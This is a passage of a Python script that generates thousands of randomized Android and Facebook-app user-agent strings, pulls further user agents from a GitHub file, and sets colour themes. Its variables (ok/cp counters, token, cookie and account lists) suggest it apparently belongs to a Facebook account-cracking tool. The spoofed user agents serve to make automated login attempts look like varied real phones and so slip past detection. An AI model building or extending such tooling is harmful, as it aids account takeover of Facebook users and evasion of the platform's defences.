'SM-G610M','SM-G610Y','SM-G611MT','SM-G611FF','SM-G611M','SM-J730G','SM-J730GM','SM-J730F','SM-J730FM','SM-S727VL','SM-S737TL','SM-J727T1','SM-J727T1','SM-J727V','SM-J727P','SM-J727VPP','SM-J727T','SM-C710F','SM-J810M','SM-J810F','SM-J810G','SM-J810Y','SM-A605K','SM-A605K','SM-A202K','SM-M336K','SM-A326K','SM-C115','SM-C115L','SM-C1158','SM-C1158','SM-C115W','SM-C115M','SM-S120VL','SM-M015G','SM-M015F','SM-M013F','SM-M017F','SM-M022G','SM-M022F','SM-M022M','SM-M025F','SM-M105G','SM-M105M','SM-M105F','SM-M107F','SM-M115F','SM-M115F','SM-M127F','SM-M127G','SM-M135M','SM-M135F','SM-M135FU','SM-M205FN','SM-M205F','SM-M205G','SM-M215F','SM-M215G','SM-M225FV','SM-M236B','SM-M236Q','SM-M305F','SM-M305M','SM-M307F','SM-M307FN','SM-M315F','SM-M317F','SM-M325FV','SM-M325F','SM-M326B','SM-M336B','SM-M336BU','SM-M405F','SM-M426B','SM-M515F','SM-M526BR','SM-M526B','SM-M536B','SM-M625F','SM-G750H','SM-G7508Q','SM-G7509','SM-N970U','SM-N970F','SM-N971N','SM-N970U1','SM-N770F','SM-N975U1','SM-N975U','SM-N975F','SM-N975F','SM-N976N','SM-N980F','SM-N981U','SM-N981B','SM-N985F','SM-N9860','SM-N986N','SM-N986U','SM-N986B','SM-N986W','SM-N9008V','SM-N9006','SM-N900A','SM-N9005','SM-N900W8','SM-N900','SM-N9009','SM-N900P','SM-N9000Q','SM-N9002','SM-9005','SM-N750L','SM-N7505','SM-N750','SM-N7502','SM-N910F','SM-N910V','SM-N910C','SM-N910U','SM-N910H','SM-N9108V','SM-N9100','SM-N915FY','SM-N9150','SM-N915T','SM-N915G','SM-N915A','SM-N915F','SM-N915S','SM-N915D','SM-N15W8','SM-N916S','SM-N916K','SM-N916L','SM-N916LSK','SM-N920L','SM-N920S','SM-N920G','SM-N920A','SM-N920C','SM-N920V','SM-N920I','SM-N920K','SM-N9208','SM-N930F','SM-N9300','SM-N930x','SM-N930P','SM-N930X','SM-N930W8','SM-N930V','SM-N930T','SM-N950U','SM-N950F','SM-N950N','SM-N960U','SM-N960F','SM-N960U','SM-N935F','SM-N935K','SM-N935S','SM-G550T','SM-G550FY','SM-G5500','SM-G5510','SM-G550T1','SM-S550TL','SM-G5520','SM-G5528','SM-G600FY','SM-G600F','SM-G6000','SM-G6100','SM-G610S','SM-G611F','SM-G611L','SM-G110M','SM-G110H','SM-G110B','SM-G910S','SM-G316HU','SM-G977N','SM-G973U1','SM-G973F','SM-G973W','SM-G973U','SM-G770U1','SM-G770F','SM-G975F','SM-G975U','SM-G970U','SM-G970U1','SM-G970F','SM-G970N','SM-G980F','SM-G981U','SM-G981N','SM-G981B','SM-G780G','SM-G780F','SM-G781W','SM-G781U','SM-G7810','SM-G9880','SM-G988B','SM-G988U','SM-G988B','SM-G988U1','SM-G985F','SM-G986U','SM-G986B','SM-G986W','SM-G986U1','SM-G991U','SM-G991B','SM-G990B','SM-G990E','SM-G990U','SM-G998U','SM-G996W','SM-G996U','SM-G996N','SM-G9960','SM-S901U','SM-S901B','SM-S908U','SM-S908U1','SM-S908B','SM-S9080','SM-S908N','SM-S908E','SM-S906U','SM-S906E','SM-S906N','SM-S906B','SM-S906U1','SM-G730V','SM-G730A','SM-G730W8','SM-C105L','SM-C101','SM-C105','SM-C105K','SM-C105S','SM-G900F','SM-G900P','SM-G900H','SM-G9006V','SM-G900M','SM-G900V','SM-G870W','SM-G890A','SM-G870A','SM-G900FD','SM-G860P','SM-G901F','SM-G901F','SM-G800F','SM-G800H','SM-G903F','SM-G903W','SM-G920F','SM-G920K','SM-G920I','SM-G920A','SM-G920P','SM-G920S','SM-G920V','SM-G920T','SM-G925F','SM-G925A','SM-G925W8','SM-G928F','SM-G928C','SM-G9280','SM-G9287','SM-G928T','SM-G928I','SM-G930A','SM-G930F','SM-G930W8','SM-G930S','SM-G930V','SM-G930P','SM-G930L','SM-G891A','SM-G935F','SM-G935T','SM-G935W8','SM-G9350','SM-G950F','SM-G950W','SM-G950U','SM-G892A','SM-G892U','SM-G8750','SM-G955F','SM-G955U','SM-G955U1','SM-G955W','SM-G955N','SM-G960U','SM-G960U1','SM-G960F','SM-G965U','SM-G965F','SM-G965U1','SM-G965N','SM-G9650','SM-J321AZ','SM-J326AZ','SM-J336AZ','SM-T116','SM-T116NU','SM-T116NY','SM-T116NQ','SM-T2519','SM-G318HZ','SM-T255S','SM-W2016','SM-W2018','SM-W2019','SM-W2021','SM-W2022','SM-G600S','SM-E426S','SM-G3812','SM-G3812B','SM-G3818','SM-G388F','SM-G389F','SM-G390F','SM-G398FN'])
   ee=random.choice(['Build/JZO54K','Build/KOT49H','Build/LRX22C','Build/KRT16S','Build/KOT49E'])
   f=random.choice(['AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/','AppleWebKit/537.36 (KHTML, like Gecko) Stargon/5.2.1 Chrome/','AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/','AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'])
   g=random.randrange(73,100)
   h='0'
   i=random.randrange(4200,4900)
   j=random.randrange(40,150)
   k=random.choice(['Mobile Safari/537.36','YaBrowser/17.3.1.383.00 Mobile Safari/E7FBAF','Mobile Safari/E7FBAF','Mobile Safari/537.36 PHX/11.8','Mobile Safari/537.36 (AirWatch Browser v22.12.1.5)','Mobile Safari/537.36 newsbreak/23.2.0'])
   uaku=(f'{aa} {b}.{c}.{d}; {dd} {e} {ee}) {f}{g}.{h}.{i}.{j} {k}')
   ugen2.append(uaku)
for xd in range(1800):
	rr = random.randint; rc = random.choice
	aZ = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
	   #fbpn = ["com.facebook.adsmanager", "com.facebook.lite", "com.facebook.orca", "com.facebook.katana", "com.facebook.mlite"]
	merek =  ["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269", "RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]
	redmi11 = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
	realmepro = f"Dalvik/2.1.0 (Linux; U; Android {str(rr(5,11))}; {str(rc(merek))}) [FBAN/Orca-Android;FBAV/114.0.0.12.14;FBLC/in_ID;FBBV/4624710;FBCR/Axis;FBMF/Realme;FBBD/Realme;FBDV/{str(rc(merek))};FBSV/242;FBCA/armeabi-v7a:armeabi;FBDM/density=2.75,width=1080,height=2179;FB_FW/1;]"
	pro = f"Mozilla/5.0 (Linux; Android {str(rr(6,9))}; {str(rc(redmi11))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,60))}.0.{str(rr(111,9999))}.{str(rr(10,141))} Mobile Safari/537.36"
	sygkamu = random.choice([pro,realmepro])
	ugen2.append(sygkamu)
for xd in range(1700):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['M2006C3MII'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uakuh=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen2.append(uakuh)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12','13'])
	c='Redmi Note 9 Pro Build/QKQ1.191215.002; wv)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(73,100)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	ugen2.append(uakuh)

	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['801SO'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 OPR/63.0.2254.62069'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen2.append(uakuh)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12','13'])
	c='SM-G960N Build/QP1A.190711.020; wv)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(73,100)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	ugen2.append(uakuh)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SM-J610F'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(80,106)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen2.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['LE2113'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen2.append(uakuh)

	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='RMX2076 Build/EPZ9W3; wv)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uakuh=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen2.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['M2012K11C'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 OPR/51.4.5237.26623'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen2.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['vivo 1002T'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen2.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['CPH2083'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 GoogleApp/13.44.10.26.arm64'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen2.append(uakuh)
	
	aa=random.choice(['Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android'])
	b=random.choice(['2.3.6;','4.0.4;','4.2.1;','4.2.2;','4.3;','4.4.2;','4.4.4;','5.0;','5.0.2;','5.1;','5.1.1;','6.0;','6;','6.0.1;','7.0;','7.0.1;','7;','8;','8.0;','8.0.1;','9;','10;','11;','12;'])
	c=random.choice(['zh-CN;','en-hk;','en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr'])
	d=random.choice(['Infinix X507','Infinix F98','Infinix G636','Infinix Hot 10','Infinix X682B','Infinix X688B','Infinix X658E','Infinix PR652B','Infinix PR652C','Infinix X658E ','Infinix X659B','ar_AE; Infinix PR652B','Infinix X689D','Infinix X689C','Infinix X662','Infinix X675','Infinix X6812B','Infinix X6817'])
	dd=random.choice(['Build/MRA58K','Build/KOT49H','Build/JDQ39','Build/LMY47V','Build/QP1A.190711.020','Build/RP1A.200720.011','Build/RP1A.201005.001','Build/RP1A.200720.011','Build/SP1A.210812.016','Build/RP1A.200720.011'])
	e='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(10,100)
	g='0'
	h=random.randrange(4200,5195)
	i=random.randrange(40,150)
	j='Mobile Safari/537.36'
	uaku2=f'{aa} {b} {c} {d} {dd}) {e}{f}.{g}.{h}.{i} {j}'
	ugen2.append(uaku2)
	
for xd in range(1700):
   aa='Mozilla/5.0 (Linux; Android 12;'
   b=random.choice(['6','7','8','9','10','11','12'])
   c='Redmi Note 7 Build/SQ1A.211205.008; wv'
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
   h=random.randrange(73,100)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Mobile Safari/537.36 OPR/61.0.2254.59937'
   uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
   ugen2.append(uaku2)
for xd in range(1600):
   aa=random.choice(['Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android'])
   b=random.choice(['2.3.6;','4.0.4;','4.2.1;','4.2.2;','4.3;','4.4.2;','4.4.4;','5.0;','5.0.2;','5.1;','5.1.1;','6.0;','6;','6.0.1;','7.0;','7.0.1;','7;','8;','8.0;','8.0.1;','9;','10;','11;','12;'])
   c='zh-CN;'
   d=random.choice(['MZ-MEIZU_M5 ','MZ-MEIZU M6','MZ-U20','MZ-m2','MZ-MX6','MZ-Meizu M6s','MZ-M3s','MZ-U10'])
   dd='Build/MRA58K'
   e='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
   f=random.randrange(10,100)
   g='0'
   h=random.randrange(4200,5195)
   i=random.randrange(40,150)
   j=random.choice(['Mobile Safari/537.36 HeyTapBrowser/41.7.36.1'])
   uaku2=f'{aa} {b} {c} {d}) {e}{f}.{g}.{h}.{i} {j}'
   ugen2.append(uaku2)
	  
   rr = random.randint
   rc = random.choice
   aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
   uaku = f'Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; en-us; SM-{str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Mobile UCBrowser/3.4.3.{str(rr(111,999))}'
   ugen2.append(uaku)   
	
   aa='Mozilla/5.0 (Linux; Android'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['en-us; GT-','Infinix','SAMSUNG SM-'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
   h=random.randrange(1,104)
   i='0'
   j=random.randrange(1,4999)
   k=random.randrange(1,150)
   l='Mobile Safari/537.36'
   uaku2=f'{aa} {b}; {c} {d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen2.append(uaku2)

for xd in range(1500):
   rr = random.randint
   rc= random.choice
   an = rr(7,12)
   tg = rr(111,999)
   aa=rr(80,105) 
   bb=rr(4200,5195)
   gg=rr(40,150)
   hh=rc(['QP1A.','RKQ1.','PPR1.','QKQ1.','KOT49H.','JSS15J.','SP1A'])
   a= rc(['2.3.6;','4.0.4;','4.2.1;','4.2.2;','4.3;','4.4.2;','4.4.4;','5.0;','5.0.2;','5.1;','5.1.1;','6.0;','6;','6.0.1;','7.0;','7.0.1;','7;','8;','8.0;','8.0.1;','9;','10;','11;','12;'])
   ronyxd = f"Mozilla/5.0 (Linux; Android {a}; R7sf Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{aa}.0.{bb}.{gg} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/315.0.0.18.109;]"
   ronyxd1=f"Mozilla/5.0 (Linux; Android {an}; Redmi Note 5 Pro Build/{hh}180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{aa}.0.{bb}.{gg} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/342.0.0.37.119;]"
   ronyxd2=f"Mozilla/5.0 (Linux; Android {an}; XIAOMI POCO F1 Build/{hh}.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{aa}.0.{bb}.{gg} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/382.0.0.33.111;]"
   ronyxd3=f"Mozilla/5.0 (Linux; Android {an}; REALME RMX1911 Build/{hh}1.211103.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{aa}.0.{bb}.{gg} Mobile Safari/537.36 GNews Android/2022089220"
   ronyxd4=f"Mozilla/5.0 (Linux; Android {an}; Nokia G11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
   ronyxd5=f"Mozilla/5.0 (Linux; Android {an}; R8111 Build/IMM76D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.{gg} Mobile Safari/537.36 OPR/71.3.3718.67322"
   uaku2=rc([ronyxd,ronyxd1,ronyxd2,ronyxd3,ronyxd4,ronyxd5])
   ugen2.append(uaku2)
	
   rr = random.randint
   rc= random.choice
   a = rr(2,11)
   an= rc(['7.0.1','7.2.1','8.1.0','9','10','11','12'])
   gg=rr(40,150)
   e=rr(10,100)
   ff=rr(20,100)
   kyt1=f"Mozilla/5.0 (Linux; Android {an}; Redmi {a}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.{gg} Mobile Safari/537.36 OPR/{e}.3.3718.67322"
   kyt2=f"Mozilla/5.0 (Linux; Android {an}; Redmi {a}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.{gg} UCBrowser/{e}.5.1.944 Mobile Safari/537.36"
   kyt3=f"Mozilla/5.0 (Linux; Android {an}; Redmi Note {a}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.{gg} Mobile Safari/537.36 HeyTapBrowser/{e}.7.36.1"
   kyt4=f"Mozilla/5.0 (Linux; Android {an}; Redmi {a} Build/{c} {d}.011; en-us) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/{e}.0.{ff}.{gg} Mobile Safari/537.36 Puffin/9.7.2.{dd}AP"
   kytku=rc([kyt1,kyt2,kyt4])
   ugen2.append(kytku)
   
   a='Mozilla/5.0 (Macintosh;'
   b=random.randrange(1,12)
   c='Infonix HOT'
   d=random.randrange(1,9)
   e='Build/SQ1A.211205.008; wv'
   f='AppleWebKit/537.36 (KHTML, like Gecko) Firefox/48.0 Chrome/'
   g=random.randrange(20,255)
   h='0'
   i=random.randrange(2000,5000)
   j=random.randrange(0,255)
   k=random.choice(['Mobile Safari/537.36','YaBrowser/17.3.1.383.00 Mobile Safari/E7FBAF','Mobile Safari/E7FBAF','Mobile Safari/537.36 PHX/11.8','Mobile Safari/537.36 (AirWatch Browser v22.12.1.5)','Mobile Safari/537.36 newsbreak/23.2.0'])
   untukmu=f'{a} {b}; {c}{d} {e}) {f}{g}.{h}.{i}.{j} {k}'
   ugen2.append(untukmu)
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen2.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
###----------[ WARNA PRINT RICH ]---------- ###
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH

M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
H3 = "[#FF00C0]" #ungu
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
U2 = "[#AF00FF]" # UNGU
O2 = "[#FF8F00]" # ORANGE

###----------[ CEK WARNA TEMA ]---------- ###
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#00C8FF]"
	color_panel = "#00C8FF"
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[]
taplikasi=['no']
cokbrut=[]
